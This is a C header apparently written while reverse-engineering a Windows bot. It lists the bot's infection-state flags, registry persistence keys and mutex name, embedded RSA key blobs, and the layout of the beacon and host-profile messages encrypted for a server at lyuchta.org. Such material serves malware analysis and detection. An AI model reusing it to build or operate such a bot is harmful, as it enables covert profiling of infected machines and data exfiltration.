/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/* 
 * File:   botinfo.h
 * Author: Levis
 *
 * Created on August 18, 2017, 11:08 AM
 */

#ifndef BOTINFO_H

#define BOTINFO_H

#include <windows.h>
#include <wincrypt.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#ifdef __cplusplus
extern "C" {
#endif

#ifdef __cplusplus
}
#endif

#define MSG_CONST_1 0x00000001
#define MSG_CONST_2 0x00000006
#define MSG_CONST_3 0x00000002
#define MSG_DELIMITER_1 0xC7A7B616
#define MSG_DELIMITER_2 0x4AC65E2A
#define MSG_START 0x0001D4C0


/*
 * Indicator for infection state
 * Setup by bitwise OR with each successful method
 * Read the comment
 */
//Create 2 keys HKLM(HKCU)\software\microsoft\windows\currentversion\ShellPrime and qiturugcenxazap success
#define IDC_WRITE_KEY_SHELL_ZAP 0x01
//When Call CreateMutext "qiturugcenxa" success
#define IDC_MUTEX_CREATED 0x02
//Create a key in HKLM(HKCU)\software\microsoft\windows\currentversion\AppManagement success
#define IDC_WRITE_KEY_APPMGNT 0x04
//Find CommObject <gzip> and <text>
#define IDC_COMOBJ_GZIP_TEXT 0x08
//Always et, since it compare 0x80000000 to 0x80000000
#define IDC_DUMMY_COMPARE 0x10
//When WSAStartup success
#define IDC_NET_CONNECTED 0x20

const BYTE magicKey[0xC] = { 0xDC, 0x60, 0x69, 0x83, 0x64, 0xEE, 0xB4, 0x55, 0xAA, 0x82, 0x57, 0xE8 };
//RSA Public key of Bot to (maybe) encrypt RC4 key used in encrypting collected data before sending to server
const BYTE bot_rsa_pub_blob[0x94] = {0x06,0x02,0x00,0x00,0x00,0xA4,0x00,0x00,0x52,0x53,0x41,0x31,0x00,0x04,0x00,0x00,0x01,0x00,0x01,0x00,0xD1,0xB1,0x99,0x84,0x91,0x7F,0x12,0x15,0xC5,0x97,0xBF,0x05,0xF4,0x61,0x63,0xD8,0xC2,0xEA,0x54,0x35,0xB0,0x33,0xFB,0x0D,0x0A,0xA7,0x52,0x98,0x6F,0x7E,0x52,0xEB,0x95,0xF8,0x66,0xDB,0xE5,0xC8,0x23,0xBE,0x5D,0x09,0x63,0x86,0x15,0x0A,0xCA,0x3F,0x0B,0xBE,0x7A,0xE6,0x46,0xD9,0x6C,0x3D,0x0D,0x59,0xAC,0xF4,0x87,0xCB,0x0A,0xE6,0x06,0xDB,0x64,0x9E,0xD3,0xBA,0x80,0x66,0x32,0xD8,0xF9,0xAC,0x29,0x05,0xCC,0xBB,0xEC,0xDC,0xAE,0x3A,0x24,0x15,0xB4,0xDD,0xFD,0xBF,0xE3,0x99,0x91,0x62,0x01,0xCF,0x19,0x48,0xFA,0xA7,0x3C,0x59,0x24,0xBD,0xD3,0xB3,0x31,0x7E,0x6A,0x9B,0xD5,0x9B,0x63,0xF9,0xF8,0x30,0x00,0xEA,0x08,0xE9,0xAB,0x17,0x70,0x57,0xD7,0xA2,0xCB,0xC4};
//Bot's RSA Private key to decrypt data sent from server. Not yet used since the remote server was taken down
const BYTE bot_rsa_priv_blob[] = {0x07, 0x02, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x32, 0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x51, 0x1E, 0xEE, 0x58, 0x2E, 0x6B, 0x18, 0xC0, 0x1D, 0x4D, 0x38, 0xD9, 0x66, 0xE6, 0xEC, 0xD5, 0x71, 0xFC, 0xF5, 0xF6, 0x79, 0xAF, 0x7E, 0xE7, 0x2F, 0x5A, 0x4B, 0x66, 0xA9, 0x12, 0xF9, 0x67, 0x96, 0xEF, 0x94, 0x33, 0xA5, 0xB1, 0x7A, 0xD8, 0x03, 0x3B, 0x34, 0x91, 0x7D, 0xAB, 0x54, 0x64, 0xD5, 0x78, 0x97, 0xCC, 0xA0, 0xB9, 0xE5, 0x19, 0x02, 0xDB, 0xF8, 0xA3, 0xE7, 0x20, 0x56, 0x56, 0xA2, 0xE0, 0x02, 0xF1, 0x5D, 0x2C, 0x76, 0xFF, 0xE8, 0x52, 0x3D, 0xFD, 0xC8, 0xA6, 0x6E, 0xE4, 0xA8, 0xED, 0xC0, 0xD3, 0xCD, 0x92, 0xE8, 0x9B, 0x7B, 0xAF, 0x79, 0x0E, 0xF4, 0x2C, 0xBC, 0x54, 0xED, 0x3A, 0xDE, 0x67, 0x36, 0xC7, 0x0C, 0xA6, 0x0F, 0xDC, 0x88, 0xEC, 0x4B, 0x78, 0x9E, 0x1B, 0x25, 0xE7, 0x79, 0xFD, 0xCD, 0x89, 0x5F, 0x83, 0x4B, 0x75, 0xFA, 0x30, 0x2C, 0xE6, 0x72, 0xB6, 0xF5, 0xA0, 0x00, 0xE5, 0x15, 0x15, 0x88, 0xF3, 0x01, 0xD6, 0xE3, 0x4B, 0x6B, 0x32, 0xF3, 0xE6, 0x3C, 0x27, 0x26, 0x85, 0x37, 0x35, 0x57, 0xAA, 0xBE, 0xEA, 0xCE, 0x9F, 0x79, 0xCF, 0x16, 0xC2, 0x77, 0x5C, 0x3A, 0x5C, 0xBC, 0x4D, 0xAC, 0x97, 0x12, 0xB1, 0x59, 0x6B, 0x4E, 0xB9, 0x3F, 0xDE, 0xC5, 0x49, 0xE2, 0x41, 0xF8, 0x06, 0xE0, 0xE0, 0x6D, 0xB8, 0xFF, 0x0D, 0x9C, 0x68, 0xBC, 0xFE, 0x6D, 0x7E, 0x0D, 0x6C, 0x9E, 0xF6, 0xA3, 0x55, 0xE4, 0xD1, 0xD5, 0x39, 0x4A, 0xDB, 0xCC, 0x1A, 0x54, 0x52, 0xC6, 0xA1, 0x86, 0xED, 0xAC, 0x81, 0x5D, 0xA8, 0xCE, 0x7C, 0x61, 0x9D, 0x76, 0x73, 0xC0, 0x7C, 0x76, 0xAD, 0x6E, 0x0F, 0xF9, 0x23, 0x80, 0xB8, 0xB2, 0x55, 0x43, 0x73, 0x0E, 0x46, 0xCD, 0x12, 0x72, 0xCB, 0x96, 0xF8, 0xFF, 0xB9, 0x44, 0xE2, 0x0B, 0xBD, 0xFE, 0xA9, 0x5A, 0xB7, 0x69, 0x2A, 0xDC, 0xFE, 0x72, 0xE6, 0xE6, 0x5D, 0x76, 0xD2, 0x4F, 0x33, 0x3B, 0x9E, 0x5C, 0x87, 0x64, 0x17, 0x14, 0x12, 0x11, 0x4B, 0xE8, 0x90, 0x49, 0x76, 0x59, 0x7E, 0x0A, 0x4F, 0x70, 0x6C, 0x29, 0xDF, 0xE3, 0x49, 0x55, 0x7B, 0x11, 0xCE, 0xF1, 0x82, 0xFB, 0x74, 0x93, 0x70, 0x22, 0x18, 0xE5, 0xE1, 0x1E, 0x34, 0xB7, 0x2E, 0xC6, 0xA1, 0x99, 0xFF, 0x43, 0xC0, 0xF4, 0x67, 0x22, 0x64, 0x89, 0xB9, 0xFB, 0xD5, 0x87, 0x2D, 0x57, 0xEE, 0xA7, 0xED, 0x96, 0x94, 0xA1, 0x78, 0x23, 0xE6, 0xBF, 0x08, 0x95, 0x64, 0x4C, 0x7A, 0x46, 0x53, 0x89, 0x1C, 0xEE, 0x64, 0x5B, 0xFE, 0xE1, 0x9C, 0x6F, 0x55, 0x8D, 0x09, 0x74, 0x53, 0x1A, 0x5C, 0xA2, 0x31, 0x2B, 0xE2, 0xD8, 0x9B, 0xA6, 0x45, 0x79, 0x38, 0xAC, 0x12, 0x8E, 0xD1, 0xEF, 0x04, 0xE7, 0xDB, 0x47, 0xA7, 0xAE, 0xE4, 0x46, 0x88, 0x15, 0xC8, 0x46, 0x8F, 0x37, 0xB7, 0x4B, 0x69, 0xDD, 0x70, 0xFA, 0x7B, 0xFB, 0x10, 0x6A, 0x2A, 0x35, 0x22, 0xD1, 0x66, 0x3A, 0xE8, 0x29, 0x2A, 0x24, 0x7F, 0xBB, 0x74, 0x1B, 0x7E, 0x1B, 0x31, 0xC6, 0x2C, 0xCC, 0xA7, 0x4D, 0xE0, 0x6A, 0x45, 0x92, 0x43, 0x0B, 0xC0, 0xA6, 0x94, 0xED, 0x5C, 0x56, 0x35, 0xA9, 0x02, 0xC2, 0xAB, 0xC9, 0xCE, 0xD0, 0x97, 0xDA, 0xC1, 0x29, 0x43, 0x09, 0xC4, 0x01, 0xD8, 0x6B, 0xD7, 0xD6, 0xAD, 0xD0, 0x33, 0x06, 0x4E, 0x5C, 0xB6, 0x4F, 0x39, 0xEC, 0x09, 0xDE, 0x98, 0x70, 0x8C, 0x9C, 0x0F, 0x87, 0xBD, 0x66, 0x6F, 0xCD, 0x14, 0x0F, 0x06, 0x25, 0x37, 0x22, 0xBF, 0xF7, 0x26, 0xB2, 0xF0, 0x81, 0x79, 0x97, 0x38, 0x38, 0x52, 0xE5, 0x41, 0xC5, 0x41, 0xDE, 0x95, 0xEB, 0x38, 0x0E, 0x61, 0x1C, 0x38, 0x1C, 0xCA, 0x2E, 0x91, 0x2D, 0x02, 0x0F, 0x1B, 0xA3, 0xCB, 0xE3, 0x42, 0x00, 0x90, 0x00, 0xDF, 0x34, 0x2F, 0x26, 0x7E, 0xDB, 0x3E, 0x60, 0x9E, 0x35, 0x41, 0x5E, 0x9F, 0xB1, 0xBB, 0xBA, 0x97, 0x1E, 0xC8, 0x51, 0x0D, 0x83, 0xFC, 0xCE, 0xD1, 0x88, 0x94, 0x58, 0x26, 0xD9, 0xC8, 0xED, 0x20, 0x68, 0x56, 0xA6, 0xB4, 0xD1, 0x5E, 0x43, 0xDD, 0x2D, 0xB6, 0x5F, 0xBD, 0x42, 0x34, 0xCB, 0xFB, 0xC7, 0x5E, 0xAD, 0x21, 0xD2, 0xC6, 0xB4, 0x62};
const char* crypt_prov_name = MS_ENHANCED_PROV_A; //"Microsoft Enhanced Cryptographic Provider v1.0";

//Structure of Request body send to server 
typedef struct {
	DWORD seed_1;
	DWORD seed_2;
	DWORD checksum;
	DWORD exportedKeyLen;
	BYTE exportedKey[140]; //Should be RC4 session Key blob
	BYTE encryptedData[];
} msgStruct;

//Structure of Info before Encrypt and send to server at lyuchta.org
typedef struct {
	DWORD delimiter1;// = MSG_DELIMITER_1;
	DWORD delimiter2;// = MSG_DELIMITER_2;
	DWORD infect_state;
	BYTE ComputerID[36];
	DWORD perf_count;
	DWORD unknown_3;
	DWORD unknown_4;
    BYTE WindowsVerLen;
	BYTE WindowsVer[];
} beaconMsg;

//Structure of collected information while the bot is running
typedef struct {
	DWORD unknown_1;
	DWORD padding_1;// = 0x00000001;
	DWORD padding_2;// = 12000;
	BYTE magic[12];// = magicKey;
	DWORD padding_3;// = 0x00000000;
	DWORD delim_1;// = MSG_DELIMITER_1;
	DWORD delim_2;// = MSG_DELIMITER_2;
	DWORD fileChecksum;
	char parentProcessPath[0xFF];
	char fullProcessPath[0xFF];
	char computerCLSID[39];
	DWORD delim_3;// = MSG_DELIMITER_1;
	DWORD delim_4;// = MSG_DELIMITER_2;
	DWORD infect_state;
	char computerCLSID_2[36];
	DWORD perf_count;
	DWORD padding_4;// = 0;
	DWORD padding_5;// = 0;
	BYTE WindowsVer[];

} processInfo;


#endif /* BOTINFO_H */

